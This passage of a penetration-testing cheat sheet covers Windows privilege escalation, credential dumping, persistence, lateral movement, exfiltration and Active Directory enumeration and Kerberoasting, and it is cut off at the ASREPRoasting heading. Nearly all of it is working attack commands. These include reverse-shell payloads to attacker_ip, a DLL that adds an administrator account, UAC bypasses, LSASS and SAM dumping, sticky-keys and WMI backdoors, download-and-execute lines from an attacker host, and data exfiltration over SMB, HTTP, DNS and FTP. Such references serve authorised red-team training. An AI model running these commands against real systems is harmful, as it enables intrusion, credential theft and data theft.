#### Unquoted Service Paths

```cmd
:: Find unquoted paths with spaces
wmic service get Name,PathName,StartName | findstr /i /v """" | findstr /i /v "C:\Windows"

:: PowerShell alternative
Get-WmiObject Win32_Service | Where-Object {$_.PathName -notmatch '"' -and $_.PathName -match " "} |
  Select-Object Name, PathName, StartName

:: Check write permissions on each component of the path
:: Example path: C:\Program Files\Vulnerable Service\bin\service.exe
:: Try to write: C:\Program.exe, C:\Program Files\Vulnerable.exe, etc.
icacls "C:\Program Files\Vulnerable Service\"
icacls "C:\Program Files\"
icacls "C:\"

:: Generate payload at hijack location
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o "C:\Program Files\Vulnerable.exe"

:: Restart service (if permissions allow)
sc stop VulnerableService
sc start VulnerableService
:: Or restart via scheduled task trigger, or wait for reboot
```

---

#### Weak Service Permissions

```cmd
:: Enumerate service permissions with accesschk (Sysinternals)
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "BUILTIN\Users" *
accesschk.exe /accepteula -uwcqv "Everyone" *
accesschk.exe /accepteula -uwcqv [username] *

:: Check specific service
accesschk.exe /accepteula -ucqv [service_name]

:: If SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS granted:
sc config [service_name] binpath= "C:\temp\payload.exe"
sc config [service_name] binpath= "cmd.exe /c net user hacker Pass1! /add"
sc stop [service_name]
sc start [service_name]

:: Check via PowerShell
Get-ACL -Path HKLM:\SYSTEM\CurrentControlSet\Services\[service_name] | Format-List
```

---

#### AlwaysInstallElevated

```cmd
:: Check both keys — BOTH must be set to 1 for exploitation
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: PowerShell check
Get-ItemProperty HKLM:\Software\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
Get-ItemProperty HKCU:\Software\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
```

```bash
# On attacker — generate malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f msi -o malicious.msi
```

```cmd
:: On target
msiexec /quiet /qn /i malicious.msi
```

---

#### DLL Hijacking

**Identify missing DLLs:**

- Run Process Monitor (ProcMon) on attacker-controlled machine with same application
- Filter: Operation is "NAME NOT FOUND", Path ends with ".dll"
- Look for DLLs searched in writable directories (user profile, temp, application directory)

**DLL search order (standard, SafeDllSearchMode enabled):**
1. Application directory (where .exe is)
2. System32 (`C:\Windows\System32`)
3. System (`C:\Windows\System`)
4. Windows directory (`C:\Windows`)
5. Current working directory
6. Directories in `%PATH%`

**Minimal malicious DLL template:**

```c
// malicious.c
#include <windows.h>
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    switch (reason) {
        case DLL_PROCESS_ATTACH:
            system("cmd.exe /c net user hacker Password1! /add && net localgroup administrators hacker /add");
            break;
    }
    return TRUE;
}
```

```bash
# Cross-compile on Linux attacker
x86_64-w64-mingw32-gcc -shared -o vulnerable.dll malicious.c
i686-w64-mingw32-gcc -shared -o vulnerable.dll malicious.c    # 32-bit
```

```cmd
:: Place DLL in the target directory
copy malicious.dll "C:\path\to\app\missing.dll"
:: Trigger application launch or service restart
```

---

#### UAC Bypass

```cmd
:: Check UAC level
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
:: 0 = No prompt (auto-elevate)
:: 1 = Prompt for credentials on secure desktop
:: 2 = Prompt for consent on secure desktop (default)
:: 5 = Prompt for consent for non-Windows binaries
```

**fodhelper.exe bypass** (Windows 10, no file write needed):

```cmd
:: fodhelper.exe auto-elevates and reads HKCU registry before launch
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /d "" /f
C:\Windows\System32\fodhelper.exe
:: Spawns elevated cmd.exe
:: Cleanup:
reg delete HKCU\Software\Classes\ms-settings /f
```

**eventvwr.exe bypass:**

```cmd
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\mscfile\shell\open\command /v DelegateExecute /d "" /f
C:\Windows\System32\eventvwr.exe
reg delete HKCU\Software\Classes\mscfile /f
```

**sdclt.exe bypass:**

```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /d "cmd.exe" /f
C:\Windows\System32\sdclt.exe
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /f
```

**UACME project** — maintained collection of 41+ bypass techniques:

```
https://github.com/hfiref0x/UACME
Usage: Akagi64.exe [Key] [Param]
Key 23 = fodhelper
Key 33 = eventvwr
Key 41 = sdclt
```

---

#### Registry Autorun Abuse

```cmd
:: Check writable autorun keys
:: List current autorun entries
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

:: Check write permissions (requires accesschk or PowerShell)
accesschk.exe /accepteula -kwsu "BUILTIN\Users" HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ACL "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" | Format-List

:: If writable (HKCU is always writable by current user):
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "WindowsUpdate" /t REG_SZ /d "C:\temp\payload.exe" /f

:: HKLM requires admin:
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "WindowsDefender" /t REG_SZ /d "C:\temp\payload.exe" /f
```

---

### 12.3 Windows Credential Extraction

#### LSASS Dump

**Task Manager method (requires admin, interactive):**

```
Task Manager → Details → lsass.exe → Right-click → Create dump file
Saved to: C:\Users\[user]\AppData\Local\Temp\lsass.DMP
```

**ProcDump (SysInternals, less AV detection):**

```cmd
procdump64.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
procdump64.exe -accepteula -ma -64 lsass.exe C:\temp\lsass.dmp
```

**comsvcs.dll method (built-in Windows — no additional tools):**

```cmd
:: Get lsass PID first
tasklist /fi "IMAGENAME eq lsass.exe"

:: Dump via rundll32
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [LSASS_PID] C:\temp\lsass.dmp full

:: PowerShell version
$lsass = Get-Process lsass
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass.Id C:\temp\lsass.dmp full
```

**Direct LSASS read with Mimikatz:**

```cmd
:: Run on target (requires SeDebugPrivilege — admin)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
mimikatz.exe "privilege::debug" "sekurlsa::wdigest" "exit"
mimikatz.exe "privilege::debug" "sekurlsa::msv" "exit"
```

**Offline analysis with pypykatz (on attacker Linux box):**

```bash
# Transfer lsass.dmp to attacker machine, then:
pip install pypykatz
pypykatz lsa minidump lsass.dmp
pypykatz lsa minidump lsass.dmp > creds.txt
```

---

#### SAM / SYSTEM Hive Extraction

```cmd
:: Requires admin — save hive files from live registry
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system
reg save HKLM\SECURITY C:\temp\security
```

```bash
# Offline extraction with Impacket secretsdump (on attacker)
python3 secretsdump.py -sam sam -system system -security security LOCAL
```

**Volume Shadow Copy method:**

```cmd
:: List shadow copies
vssadmin list shadows

:: Copy SAM from shadow copy (bypasses VSS file lock)
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam_vss
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system_vss
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\temp\security_vss

:: Create shadow copy if none exist (admin)
wmic shadowcopy call create Volume='C:\'
vssadmin create shadow /for=C:
```

---

#### DPAPI Credential Decryption

```cmd
:: Enumerate credential blobs
dir C:\Users\[user]\AppData\Roaming\Microsoft\Credentials\ /a
dir C:\Users\[user]\AppData\Local\Microsoft\Credentials\ /a

:: Mimikatz DPAPI — online decryption (user logged in)
mimikatz.exe "vault::cred /patch" "exit"
mimikatz.exe "dpapi::cred /in:C:\Users\[user]\AppData\Roaming\Microsoft\Credentials\[BLOB]" "exit"

:: Mimikatz DPAPI — using masterkey
mimikatz.exe "dpapi::masterkey /in:C:\Users\[user]\AppData\Roaming\Microsoft\Protect\[SID]\[GUID] /rpc" "exit"
mimikatz.exe "dpapi::cache" "dpapi::cred /in:[blob_path]" "exit"
```

---

#### Windows Credential Manager

```cmd
:: List stored credentials
cmdkey /list

:: Mimikatz vault extraction
mimikatz.exe "vault::list" "vault::cred /patch" "exit"

:: Use stored RDP/network credentials
cmdkey /add:target /user:domain\user /pass:password
runas /savecred /user:domain\user "cmd.exe"
```

---

#### PowerShell History

```powershell
# Location of PSReadLine command history
$history = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Get-Content $history

# All users (admin required)
Get-ChildItem C:\Users -Directory | ForEach-Object {
    $hist = "$($_.FullName)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $hist) { Write-Host "=== $($_.Name) ==="; Get-Content $hist }
}
```

---

#### Browser Credentials

```powershell
# Chrome Login Data location
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
# This is a SQLite database — query from attacker or use SharpChrome

# Firefox
$ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles\"
Get-ChildItem $ffPath    # find profile directory
# Files: key4.db (encryption keys), logins.json (encrypted credentials)
# Decrypt with: python3 firefox_decrypt.py /path/to/profile
```

```bash
# LaZagne — credential dumping multi-browser/multi-app
LaZagne.exe all
LaZagne.exe browsers
LaZagne.exe windows
```

---

### 12.4 Windows Persistence

**Registry autorun (user-level, no admin needed):**

```cmd
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "SecurityHealth" /t REG_SZ /d "C:\Users\Public\payload.exe" /f

:: RunOnce (executes once then deletes itself)
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v "Setup" /t REG_SZ /d "C:\temp\payload.exe" /f
```

**Scheduled task:**

```cmd
:: Runs at logon as current user
schtasks /create /tn "WindowsUpdate" /tr "C:\temp\payload.exe" /sc onlogon /f

:: Runs every 5 minutes
schtasks /create /tn "SystemMonitor" /tr "C:\temp\payload.exe" /sc minute /mo 5 /f

:: Runs at system startup as SYSTEM (admin required)
schtasks /create /tn "SysInit" /tr "C:\temp\payload.exe" /sc onstart /ru SYSTEM /f

:: Mimicking legitimate task
schtasks /create /tn "\Microsoft\Windows\Defrag\ScheduledDefrag" /tr "C:\temp\payload.exe" /sc weekly /f
```

**Service creation (admin required):**

```cmd
sc create "WindowsUpdate" binpath= "C:\temp\payload.exe" start= auto
sc description "WindowsUpdate" "Keeps Windows and apps up-to-date"
sc start "WindowsUpdate"
```

PowerShell:

```powershell
New-Service -Name "WindowsUpdate" -BinaryPathName "C:\temp\payload.exe" -StartupType Automatic
Start-Service "WindowsUpdate"
```

**Startup folder:**

```cmd
:: Current user startup (no admin)
copy payload.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

:: All users startup (admin required)
copy payload.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"

:: Open startup folder:
:: shell:startup       (user)
:: shell:common startup (all users)
```

**WMI event subscription (fileless persistence, admin required):**

PowerShell WMI persistence:

```powershell
# Create WMI event filter (trigger: 60 seconds after system boot)
$filterArgs = @{
    Name = "SystemStartupFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 60 AND TargetInstance.SystemUpTime < 90"
}
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs

# Create event consumer (executes payload)
$consumerArgs = @{
    Name = "SystemStartupConsumer"
    CommandLineTemplate = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive -WindowStyle Hidden -Command 'IEX(IWR http://attacker/payload.ps1)'"
}
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs

# Bind filter to consumer
$bindingArgs = @{
    Filter = $filter
    Consumer = $consumer
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs
```

List and remove WMI persistence:

```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding

# Remove:
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
```

**COM object hijacking (HKCU, no admin needed):**

```cmd
:: Application loads COM object from HKLM — override in HKCU
:: Example: hijacking a missing CLSID loaded by a frequently-run application

reg add "HKCU\SOFTWARE\Classes\CLSID\{target-CLSID}\InProcServer32" /ve /t REG_SZ /d "C:\temp\malicious.dll" /f
reg add "HKCU\SOFTWARE\Classes\CLSID\{target-CLSID}\InProcServer32" /v ThreadingModel /t REG_SZ /d "Apartment" /f
```

**Image File Execution Options — accessibility backdoor (admin required):**

```cmd
:: Classic sticky keys backdoor — replace debugger with cmd.exe
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
:: Press Shift 5 times at Windows login screen → cmd as SYSTEM

:: Same for other accessibility tools:
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
```

**BITS jobs persistence:**

```cmd
bitsadmin /create /download backdoorjob
bitsadmin /addfile backdoorjob http://attacker.com/payload.exe C:\temp\payload.exe
bitsadmin /SetNotifyCmdLine backdoorjob C:\temp\payload.exe NUL
bitsadmin /SetMinRetryDelay backdoorjob 60
bitsadmin /resume backdoorjob
```

---

### 12.5 Windows Lateral Movement

#### Pass-the-Hash (PtH)

**Mimikatz PTH — spawns process with stolen NTLM hash:**

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

:: PtH to spawn cmd.exe with DA context
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:NTLM_HASH_HERE /run:cmd.exe" "exit"

:: PtH to specific command
mimikatz.exe "sekurlsa::pth /user:admin /domain:corp.local /ntlm:HASH /run:\"powershell.exe -w hidden\"" "exit"
```

**Impacket psexec (SMB + service creation):**

```bash
python3 psexec.py domain/user@target_ip -hashes :NTLM_HASH
python3 psexec.py corp.local/Administrator@10.10.10.5 -hashes :NTLMHASHHERE
```

**Impacket wmiexec (WMI — less noisy, no service creation):**

```bash
python3 wmiexec.py domain/user@target_ip -hashes :NTLM_HASH
python3 wmiexec.py corp.local/admin@10.10.10.5 -hashes :HASH
```

**Impacket smbexec (SMB — uses cmd.exe, no binary upload):**

```bash
python3 smbexec.py domain/user@target_ip -hashes :NTLM_HASH
```

**Impacket atexec (scheduled task execution):**

```bash
python3 atexec.py domain/user@target_ip -hashes :NTLM_HASH "whoami"
```

**CrackMapExec (bulk lateral movement):**

```bash
cme smb 10.10.10.0/24 -u Administrator -H NTLM_HASH
cme smb targets.txt -u admin -H NTLM_HASH --exec-method wmiexec
cme smb target_ip -u admin -H HASH -x "whoami"
cme smb target_ip -u admin -H HASH --sam    :: dump SAM
cme smb target_ip -u admin -H HASH --lsa    :: dump LSA secrets
```

**RDP Pass-the-Hash (requires DisableRestrictedAdmin=0):**

```cmd
:: Enable restricted admin mode on target (if admin already)
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

:: Connect with hash from Linux attacker
xfreerdp /u:admin /d:corp.local /pth:NTLM_HASH /v:target_ip
```

---

#### Pass-the-Ticket (PtT)

```cmd
:: Rubeus — inject .kirbi ticket
Rubeus.exe ptt /ticket:base64encodedticket==
Rubeus.exe ptt /ticket:C:\temp\ticket.kirbi

:: Mimikatz
mimikatz.exe "kerberos::ptt C:\temp\ticket.kirbi" "exit"

:: List current tickets
klist

:: Use stolen ticket immediately
dir \\target_dc\C$
Enter-PSSession -ComputerName target_dc
```

---

#### WinRM (PowerShell Remoting)

```powershell
# Interactive session
Enter-PSSession -ComputerName target_ip -Credential (Get-Credential)
Enter-PSSession -ComputerName dc01.corp.local -Credential corp\admin

# One-off command execution
Invoke-Command -ComputerName target_ip -ScriptBlock { whoami; hostname }
Invoke-Command -ComputerName target_ip -Credential $cred -ScriptBlock { ipconfig /all }

# Run script from file
Invoke-Command -ComputerName target_ip -FilePath C:\temp\recon.ps1

# Load module in remote session
$session = New-PSSession -ComputerName target_ip -Credential $cred
Invoke-Command -Session $session -ScriptBlock { IEX(IWR http://attacker/PowerView.ps1) }
```

```bash
# evil-winrm (from Linux attacker)
evil-winrm -i target_ip -u Administrator -p 'Password1!'
evil-winrm -i target_ip -u Administrator -H NTLM_HASH
evil-winrm -i target_ip -u Administrator -p 'Pass' -S    # HTTPS/SSL
```

---

#### SMB / PsExec Style

```bash
# Impacket psexec (with password)
python3 psexec.py corp.local/Administrator:'Password1!'@target_ip

# SysInternals PsExec (from Windows)
psexec.exe \\target_ip -u DOMAIN\user -p password cmd.exe
psexec.exe \\target_ip -u DOMAIN\user -p password -s cmd.exe    # SYSTEM
```

---

#### RDP Lateral Movement

```bash
# From Linux — xfreerdp
xfreerdp /u:Administrator /p:'Password1!' /v:target_ip
xfreerdp /u:Administrator /p:'Password1!' /v:target_ip /cert-ignore
xfreerdp /u:Administrator /d:corp.local /p:'Password1!' /v:target_ip +clipboard /drive:loot,/tmp
```

```cmd
:: Enable RDP if disabled (requires admin)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

:: Enable RDP via WMI (remote, if WMI access)
wmic /node:target_ip /user:DOMAIN\admin /password:pass path Win32_TerminalServiceSetting WHERE (__CLASS !='') CALL SetAllowTSConnections 1

:: Add user to RDP group
net localgroup "Remote Desktop Users" hacker /add
```

---

#### DCOM Lateral Movement

```cmd
:: MMC20.Application via PowerShell
$dcom = [System.Activator]::CreateInstance([System.Type]::GetTypeFromProgID("MMC20.Application","target_ip"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c C:\temp\payload.exe","7")
```

```bash
# Impacket dcomexec
python3 dcomexec.py corp.local/admin:'Password1!'@target_ip 'cmd.exe /c whoami'
python3 dcomexec.py corp.local/admin@target_ip -hashes :NTLM 'cmd.exe /c powershell IEX(IWR http://attacker/p.ps1)'
```

---

### 12.6 Windows File Transfer and Exfiltration

**Download to target:**

```cmd
:: certutil (built-in, flagged by most AV)
certutil.exe -urlcache -split -f http://attacker_ip/payload.exe C:\temp\payload.exe
certutil.exe -urlcache -split -f http://attacker_ip/nc.exe C:\Windows\Temp\nc.exe

:: bitsadmin
bitsadmin /transfer "WindowsUpdate" /download /priority normal http://attacker_ip/payload.exe C:\temp\payload.exe

:: PowerShell
(New-Object Net.WebClient).DownloadFile("http://attacker/payload.exe", "C:\temp\payload.exe")
Invoke-WebRequest -Uri "http://attacker/payload.exe" -OutFile "C:\temp\payload.exe"
iwr http://attacker/payload.exe -OutFile C:\temp\payload.exe

:: PowerShell in-memory execution (no disk write)
IEX (New-Object Net.WebClient).DownloadString("http://attacker/payload.ps1")
IEX(IWR http://attacker/payload.ps1 -UseBasicParsing)
```

**Encode/decode with certutil (bypass simple content filters):**

```cmd
:: Encode file to base64
certutil.exe -encode C:\temp\payload.exe C:\temp\payload.b64

:: Decode
certutil.exe -decode C:\temp\payload.b64 C:\temp\payload.exe
```

**Exfiltration via SMB:**

```cmd
:: Map attacker share
net use \\attacker_ip\share /user:attacker_user attacker_pass
copy C:\sensitive\data.zip \\attacker_ip\share\
net use \\attacker_ip\share /delete
```

**Exfiltration via HTTP POST (PowerShell):**

```powershell
# Simple POST to attacker HTTP listener
$file = [System.IO.File]::ReadAllBytes("C:\sensitive\data.zip")
$encoded = [System.Convert]::ToBase64String($file)
Invoke-WebRequest -Uri http://attacker_ip/upload -Method POST -Body $encoded

# Or multipart form upload
$form = @{ file = Get-Item "C:\sensitive\data.zip" }
Invoke-RestMethod -Uri http://attacker_ip/upload -Method POST -Form $form
```

**DNS exfiltration:**

```cmd
:: Manual DNS exfil (slow, for heavily firewalled environments)
:: Encode data in subdomain labels, exfil to attacker-controlled DNS server
nslookup [base64_chunk].attacker.com [attacker_dns_ip]
```

PowerShell DNS exfil loop:

```powershell
$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\loot\data.txt"))
$chunks = $data -split '(.{50})' | Where-Object { $_ }
foreach ($chunk in $chunks) {
    $query = "$chunk.exfil.attacker.com"
    Resolve-DnsName $query -Server attacker_ip -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 500
}
```

**FTP exfiltration via PowerShell:**

```powershell
$ftp = [System.Net.FtpWebRequest]::Create("ftp://attacker_ip/data.zip")
$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
$ftp.Credentials = New-Object Net.NetworkCredential("ftpuser","ftppass")
$bytes = [System.IO.File]::ReadAllBytes("C:\sensitive\data.zip")
$ftp.ContentLength = $bytes.Length
$stream = $ftp.GetRequestStream()
$stream.Write($bytes, 0, $bytes.Length)
$stream.Close()
```

---

## SECTION 13: ACTIVE DIRECTORY ATTACKS

### 13.1 AD Enumeration

#### Native Windows Commands

```cmd
:: Domain user enumeration
net user /domain
net user [username] /domain

:: Domain group enumeration
net group /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net group "Domain Controllers" /domain
net group "Schema Admins" /domain

:: Domain controller enumeration
nltest /dclist:[domain.local]
nltest /domain_trusts
nltest /dsgetdc:[domain.local]

:: LDAP query native
dsquery user -limit 0
dsquery group -name "Domain Admins" | dsget group -members -expand
dsquery computer -limit 0
```

PowerShell (RSAT — if available):

```powershell
Get-ADUser -Filter * -Properties * | Select-Object Name,SamAccountName,Description,PasswordLastSet,PasswordNeverExpires,LastLogonDate,Enabled | Export-Csv C:\temp\users.csv

Get-ADComputer -Filter * -Properties * | Select-Object Name,OperatingSystem,LastLogonDate,IPv4Address

Get-ADGroup -Filter * | Select-Object Name,GroupScope,GroupCategory

Get-ADGroupMember "Domain Admins" -Recursive

Get-ADDomainController -Filter *

Get-ADTrust -Filter *

# Find accounts with descriptions (often contain passwords)
Get-ADUser -Filter * -Properties Description | Where-Object {$_.Description -ne $null} | Select-Object Name,Description
```

---

#### BloodHound / SharpHound

```cmd
:: SharpHound data collection (all methods)
SharpHound.exe -c All --outputdirectory C:\temp --zipfilename bh_output
SharpHound.exe -c All,GPOLocalGroup --outputdirectory C:\temp
SharpHound.exe -c DCOnly    :: DC-only — less noisy
SharpHound.exe --stealth    :: stealth mode

:: Target specific domain
SharpHound.exe -c All -d corp.local --domaincontroller dc01.corp.local
```

```bash
# BloodHound.py from Linux (no agent on target needed)
pip3 install bloodhound
python3 bloodhound.py -d corp.local -u user -p 'Password1!' -c All -ns 10.10.10.1
python3 bloodhound.py -d corp.local -u user -p 'Pass' -c All -ns DC_IP --zip

# With NTLM hash
python3 bloodhound.py -d corp.local -u user --hashes :NTLM -c All -ns DC_IP
```

**Key BloodHound Cypher queries:**

```cypher
// Shortest path to Domain Admins from owned users
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p

// Find all Domain Admins
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}) RETURN u.name

// Kerberoastable users
MATCH (u:User {hasspn:true, enabled:true}) RETURN u.name, u.serviceprincipalnames

// ASREPRoastable users
MATCH (u:User {dontreqpreauth:true, enabled:true}) RETURN u.name

// Computers where DA has sessions
MATCH (u:User {name:"ADMINISTRATOR@CORP.LOCAL"})-[:HasSession]->(c:Computer) RETURN c.name

// Find paths from owned computers to DA
MATCH p=shortestPath((c:Computer {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p
```

---

#### PowerView

```powershell
# Import module
. .\PowerView.ps1
Import-Module .\PowerView.ps1

# Domain info
Get-Domain
Get-DomainController
Get-DomainController -Domain corp.local

# User enumeration
Get-DomainUser
Get-DomainUser -Identity administrator -Properties *
Get-DomainUser -Properties samaccountname,description,pwdlastset,logoncount | Where-Object {$_.description}

# Group enumeration
Get-DomainGroup
Get-DomainGroupMember "Domain Admins"
Get-DomainGroupMember "Domain Admins" -Recurse

# Computer enumeration
Get-DomainComputer
Get-DomainComputer -Properties name,operatingsystem,lastlogondate

# Find where current user has local admin
Find-LocalAdminAccess -Verbose
Find-LocalAdminAccess -Threads 20

# Session enumeration (where are users logged in)
Invoke-UserHunter
Invoke-UserHunter -CheckAccess    # also verify local admin

# Trust enumeration
Get-DomainTrust
Get-ForestTrust

# ACL enumeration
Invoke-ACLScanner -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "domain users"}
Get-DomainObjectACL -Identity "Domain Admins" -ResolveGUIDs
Get-DomainObjectACL -Identity [target_user] -ResolveGUIDs | Select-Object SecurityIdentifier,ActiveDirectoryRights

# GPO enumeration
Get-DomainGPO
Get-DomainGPO -Properties DisplayName,gpcfilesyspath
Get-DomainGPOLocalGroup
Get-DomainGPOComputerLocalGroupMapping -ComputerName [target]
```

---

#### LDAP Queries from Linux

```bash
# Basic LDAP enumeration
ldapsearch -x -H ldap://dc_ip -D "user@corp.local" -w "Password1!" -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName

# Anonymous bind (if allowed)
ldapsearch -x -H ldap://dc_ip -b "DC=corp,DC=local" "(objectClass=*)" | head -100

# All users
ldapsearch -x -H ldap://dc_ip -D "user@corp.local" -w 'Pass' \
  -b "DC=corp,DC=local" "(&(objectClass=user)(objectCategory=person))" \
  sAMAccountName displayName mail description

# Kerberoastable users (SPN set, not disabled)
ldapsearch -x -H ldap://dc_ip -D "user@corp.local" -w 'Pass' \
  -b "DC=corp,DC=local" \
  "(&(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" \
  sAMAccountName servicePrincipalName

# ASREPRoastable users (preauthentication not required)
ldapsearch -x -H ldap://dc_ip -D "user@corp.local" -w 'Pass' \
  -b "DC=corp,DC=local" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName

# LAPS passwords (if user has read access)
ldapsearch -x -H ldap://dc_ip -D "user@corp.local" -w 'Pass' \
  -b "DC=corp,DC=local" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd ms-MCS-AdmPwdExpirationTime sAMAccountName
```

---

### 13.2 Kerberoasting

Kerberoasting extracts service account TGS tickets which are encrypted with the service account's NTLM hash, enabling offline cracking.

```cmd
:: Find SPNs via setspn (Windows)
setspn -T corp.local -Q */*
setspn -T corp.local -F -Q */*    :: forest-wide
```

```bash
# Impacket GetUserSPNs — request tickets and output in hashcat format
python3 GetUserSPNs.py corp.local/user:Password1! -dc-ip DC_IP -request
python3 GetUserSPNs.py corp.local/user:Password1! -dc-ip DC_IP -request -outputfile kerberoast.txt
python3 GetUserSPNs.py corp.local/user -hashes :NTLM -dc-ip DC_IP -request
```

```cmd
:: Rubeus (on Windows target)
Rubeus.exe kerberoast /outfile:hashes.txt
Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat
Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql.hash    :: target specific account
Rubeus.exe kerberoast /rc4opsec    :: request RC4 only (faster to crack)
```

```powershell
# PowerView
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash | Out-File kerberoast.txt
Invoke-Kerberoast -Identity svc_sql -OutputFormat Hashcat
```

```bash
# Crack with hashcat (mode 13100 = TGS-REP, RC4)
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force

# AES hash (mode 19600/19700)
hashcat -m 19600 kerberoast.txt rockyou.txt    # AES128-CTS-HMAC-SHA1-96
hashcat -m 19700 kerberoast.txt rockyou.txt    # AES256-CTS-HMAC-SHA1-96

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs kerberoast.txt
```

---

### 13.3 ASREPRoasting

